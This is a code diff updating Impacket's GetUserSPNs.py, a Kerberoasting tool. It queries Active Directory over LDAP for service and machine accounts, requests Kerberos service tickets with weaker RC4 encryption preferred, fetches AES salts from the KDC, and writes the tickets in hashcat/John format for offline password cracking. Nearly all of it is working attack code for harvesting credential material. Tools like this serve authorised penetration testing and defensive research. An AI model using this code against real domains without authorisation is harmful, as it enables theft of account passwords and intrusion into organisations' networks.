@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -28,8 +30,6 @@
 #   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
 #
 
-from __future__ import division
-from __future__ import print_function
 import argparse
 import logging
 import sys
@@ -41,14 +41,13 @@ from impacket import version
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
     UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
 from impacket.examples import logger
-from impacket.examples.utils import parse_credentials
+from impacket.examples.utils import parse_identity, ldap_login
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP, AS_REP
 from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, RC4_PREFERRED_TGS_ENCTYPES
 from impacket.krb5.types import Principal
 from impacket.ldap import ldap, ldapasn1
-from impacket.smbconnection import SMBConnection, SessionError
 from impacket.ntlm import compute_lmhash, compute_nthash
 
 
@@ -80,6 +79,7 @@ class GetUserSPNs:
         self.__nthash = ''
         self.__no_preauth = cmdLineOptions.no_preauth
         self.__outputFileName = cmdLineOptions.outputfile
+        self.__noRC4 = cmdLineOptions.no_rc4
         self.__usersFile = cmdLineOptions.usersfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
@@ -90,8 +90,14 @@ class GetUserSPNs:
         self.__saveTGS = cmdLineOptions.save
         self.__requestUser = cmdLineOptions.request_user
         self.__stealth = cmdLineOptions.stealth
+        self.__machineOnly = cmdLineOptions.machine_only
+        self.__requestMachine = cmdLineOptions.request_machine
+        self.__ldaps = cmdLineOptions.ldaps_flag
+
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
+
+
 
         # Create the baseDN
         domainParts = self.__targetDomain.split('.')
@@ -107,29 +113,6 @@ class GetUserSPNs:
             logging.warning('KDC IP address and hostname will be ignored because of cross-domain targeting.')
             self.__kdcIP = None
             self.__kdcHost = None
-
-    def getMachineName(self, target):
-        try:
-            s = SMBConnection(target, target)
-            s.login('', '')
-        except OSError as e:
-            if str(e).find('timed out') > 0:
-                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
-                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
-            else:
-                raise
-        except SessionError as e:
-            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
-                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
-                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
-            else:
-                raise
-        except Exception:
-            if s.getServerName() == '':
-                raise Exception('Error while anonymous logging into %s' % target)
-        else:
-            s.logoff()
-        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())
 
     @staticmethod
     def getUnixTime(t):
@@ -149,7 +132,7 @@ class GetUserSPNs:
         # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
         # cleartext password.
         # If no clear text password is provided, we just go with the defaults.
-        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
+        if self.__password != '' and (self.__lmhash == '' and self.__nthash == '') and not self.__noRC4:
             try:
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                         compute_lmhash(self.__password),
@@ -173,6 +156,61 @@ class GetUserSPNs:
         TGT['sessionKey'] = sessionKey
 
         return TGT
+
+    def _ktsalt(self, username, realm):
+        from impacket.krb5.asn1 import AS_REQ, AS_REP, KRB_ERROR, METHOD_DATA, ETYPE_INFO2, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter
+        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+        from impacket.krb5.types import KerberosTime, Principal
+        from pyasn1.codec.der import encoder, decoder
+        from pyasn1.type.univ import noValue
+        import datetime
+        try:
+            req = AS_REQ()
+            req['pvno'] = 5
+            req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+            req['padata'] = noValue
+            req['padata'][0] = noValue
+            req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+            pac = KERB_PA_PAC_REQUEST(); pac['include-pac'] = True
+            req['padata'][0]['padata-value'] = encoder.encode(pac)
+            rb = req['req-body']
+            rb['kdc-options'] = constants.encodeFlags([constants.KDCOptions.forwardable.value,
+                constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value])
+            seq_set(rb, 'cname', Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
+            seq_set(rb, 'sname', Principal('krbtgt/%s' % realm, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
+            rb['realm'] = realm
+            t = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
+            rb['till'] = t; rb['rtime'] = t; rb['nonce'] = 0x41414141
+            seq_set_iter(rb, 'etype', (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)))
+            try:
+                data = sendReceive(encoder.encode(req), realm, self.__kdcHost or self.__kdcIP)
+            except KerberosError as e:
+                data = e.getErrorPacket()
+            def pick(pas):
+                for p in pas:
+                    if int(p['padata-type']) == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
+                        for ei in decoder.decode(p['padata-value'], asn1Spec=ETYPE_INFO2())[0]:
+                            if ei['salt'].hasValue():
+                                return str(ei['salt'])
+                return None
+            salt = None
+            try:
+                err = decoder.decode(data, asn1Spec=KRB_ERROR())[0]
+                if err['e-data'].hasValue():
+                    salt = pick(decoder.decode(bytes(err['e-data']), asn1Spec=METHOD_DATA())[0])
+            except Exception:
+                try:
+                    rep = decoder.decode(data, asn1Spec=AS_REP())[0]
+                    if rep['padata'].hasValue():
+                        salt = pick(rep['padata'])
+                except Exception:
+                    pass
+            if salt and salt.startswith(realm):
+                return salt[len(realm):]
+            return salt or username
+        except Exception:
+            return username
 
     def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
         if self.__no_preauth:
@@ -205,7 +243,7 @@ class GetUserSPNs:
                 fd.write(entry + '\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
+                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, self._ktsalt(username, str(decodedTGS['ticket']['realm'])), decodedTGS['ticket']['realm'],
                 spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
@@ -215,7 +253,7 @@ class GetUserSPNs:
                 fd.write(entry + '\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
+                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, self._ktsalt(username, str(decodedTGS['ticket']['realm'])), decodedTGS['ticket']['realm'],
                 spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
@@ -244,7 +282,7 @@ class GetUserSPNs:
             ccache = CCache()
             try:
                 ccache.fromTGS(ticket, oldSessionKey, sessionKey)
-                ccache.saveFile('%s.ccache' % username)
+                ccache.saveFile('%s.ccache' % username, chmod=0o600)
             except Exception as e:
                 logging.error(str(e))
 
@@ -253,63 +291,43 @@ class GetUserSPNs:
             self.request_users_file_TGSs()
             return
 
-        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
-            self.__target = self.__kdcHost
-        else:
-            if self.__kdcIP is not None and self.__targetDomain == self.__domain:
-                self.__target = self.__kdcIP
-            else:
-                self.__target = self.__targetDomain
-
-            if self.__doKerberos:
-                logging.info('Getting machine hostname')
-                self.__target = self.getMachineName(self.__target)
-
         # Connect to LDAP
-        try:
-            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
-            if self.__doKerberos is not True:
-                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
-                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
-                                             self.__nthash,
-                                             self.__aesKey, kdcHost=self.__kdcIP)
-        except ldap.LDAPSessionError as e:
-            if str(e).find('strongerAuthRequired') >= 0:
-                # We need to try SSL
-                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
-                if self.__doKerberos is not True:
-                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-                else:
-                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
-                                                 self.__nthash,
-                                                 self.__aesKey, kdcHost=self.__kdcIP)
-            else:
-                if str(e).find('NTLMAuthNegotiate') >= 0:
-                    logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
-                                     "authentication instead.")
-                else:
-                    if self.__kdcIP is not None and self.__kdcHost is not None:
-                        logging.critical("If the credentials are valid, check the hostname and IP address of KDC. They "
-                                         "must match exactly each other")
-                raise
+        ldapConnection = ldap_login(self.__target, self.baseDN, self.__kdcIP, self.__kdcHost, self.__doKerberos, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, ldaps_flag=self.__ldaps, target_domain=self.__targetDomain, fqdn=True)
+        # updating "self.__target" as it may have changed in the ldap_login processing
+        self.__target = ldapConnection._dstHost
 
         # Building the search filter
         filter_spn = "servicePrincipalName=*"
         filter_person = "objectCategory=person"
+        filter_computer = "objectCategory=computer"
         filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"
 
-        searchFilter = "(&"
-        searchFilter += "(" + filter_person + ")"
-        searchFilter += "(" + filter_not_disabled + ")"
+        if self.__machineOnly is True:
+            logging.debug('-machine-only flag detected')
+            searchFilter = "(&"
+            searchFilter += "(" + filter_computer + ")"
+            searchFilter += "(" + filter_not_disabled + ")"
+
+            # not updating to F-string due to other code using old string formatting
+            if self.__requestMachine is not None:
+                logging.debug('Including machine account (%s) in LDAP query filter' % self.__requestMachine)
+                searchFilter += '(sAMAccountName:=%s)' % (self.__requestMachine)
+
+        # traditional SPN based on person search
+        else:
+            searchFilter = "(&"
+            searchFilter += "(" + filter_person + ")"
+            searchFilter += "(" + filter_not_disabled + ")"
+
+            if self.__requestUser is not None:
+                searchFilter += '(sAMAccountName:=%s)' % self.__requestUser
 
         if self.__stealth is True:
             logging.warning('Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.')
         else:
             searchFilter += "(" + filter_spn + ")"
 
-        if self.__requestUser is not None:
-            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser
+
 
         searchFilter += ')'
 
@@ -386,7 +404,7 @@ class GetUserSPNs:
                                              "Delegation"])
             print('\n\n')
 
-            if self.__requestTGS is True or self.__requestUser is not None:
+            if self.__requestTGS is True or self.__requestUser is not None or self.__requestMachine is not None:
                 # Let's get unique user names and a SPN to request a TGS for
                 users = dict((vals[1], vals[0]) for vals in answers)
 
@@ -410,7 +428,8 @@ class GetUserSPNs:
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                 self.__kdcIP,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
-                                                                                TGT['sessionKey'])
+                                                                                TGT['sessionKey'],
+                                                                                etypes=RC4_PREFERRED_TGS_ENCTYPES)
                         self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                        self.__targetDomain + "/" + sAMAccountName, fd)
                     except Exception as e:
@@ -446,7 +465,7 @@ class GetUserSPNs:
                                                                             lmhash=(self.__lmhash),
                                                                             nthash=(self.__nthash),
                                                                             aesKey=self.__aesKey,
-                                                                            kdcHost=self.__kdcHost,
+                                                                            kdcHost=self.__kdcHost or self.__kdcIP,
                                                                             serverName=username,
                                                                             kerberoast_no_preauth=True)
                     self.outputTGS(tgt, oldSessionKey, sessionKey, username, username, fd)
@@ -469,7 +488,8 @@ class GetUserSPNs:
                     tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                             self.__kdcIP,
                                                                             TGT['KDC_REP'], TGT['cipher'],
-                                                                            TGT['sessionKey'])
+                                                                            TGT['sessionKey'],
+                                                                            etypes=RC4_PREFERRED_TGS_ENCTYPES)
                     self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
                 except Exception as e:
                     logging.debug("Exception:", exc_info=True)
@@ -494,15 +514,23 @@ if __name__ == '__main__':
                                                          ' through the AS')
     parser.add_argument('-stealth', action='store_true', help='Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. '
                                                               'May cause huge memory consumption / errors on large domains.')
+    parser.add_argument('-machine-only', action='store_true', default=False, help='Queries for machine accounts only, by adjusting `objectCategory=person` to `objectCategory=computer`. Active Directory may limit results to 1,000 objects by default. LDAP paging is required to retrieve more.')
+
     parser.add_argument('-usersfile', help='File with user per line to test')
+
     parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                              'in JtR/hashcat format (default False)')
-    parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
+    exclusive_request_group = parser.add_mutually_exclusive_group()
+    exclusive_request_group.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                                                   'to the user specified (just the username, no domain needed)')
+
+    exclusive_request_group.add_argument('-request-machine', metavar='machinename', help='Requests TGS for the SPN associated to the machine specified. Example: `workstation01$`')
+
     parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
                                                                           '<username>.ccache. Auto selects -request')
     parser.add_argument('-outputfile', action='store',
                         help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
+    parser.add_argument('-no-rc4', action='store_true', default=False, help='Does not force RC4-HMAC for the TGT')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
@@ -526,7 +554,8 @@ if __name__ == '__main__':
     group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
                                                                             'If ommited, the domain part (FQDN) '
                                                                             'specified in the account parameter will be used')
-
+    group.add_argument('-ldaps', '-use-ldaps', dest='ldaps_flag', action='store_true',
+                       help='Use LDAPS instead of LDAP')
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
@@ -534,21 +563,14 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts)
+    logger.init(options.ts, options.debug)
 
     if options.no_preauth and options.usersfile is None:
         logging.error('You have to specify -usersfile when -no-preauth is supplied. Usersfile must contain'
                       ' a list of SPNs and/or sAMAccountNames to Kerberoast.')
         sys.exit(1)
 
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
-
-    userDomain, username, password = parse_credentials(options.target)
+    userDomain, username, password, _, _, options.k = parse_identity(options.target, options.hashes, options.no_pass, options.aesKey, options.k)
 
     if userDomain == '':
         logging.critical('userDomain should be specified!')
@@ -559,16 +581,12 @@ if __name__ == '__main__':
     else:
         targetDomain = userDomain
 
-    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
-        from getpass import getpass
-
-        password = getpass("Password:")
-
-    if options.aesKey is not None:
-        options.k = True
-
     if options.save is True or options.outputfile is not None:
         options.request = True
+
+    # auto enable machineonly, and request flag on -request-machine
+    if options.request_machine is not None:
+        options.machine_only = True
 
     try:
         executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
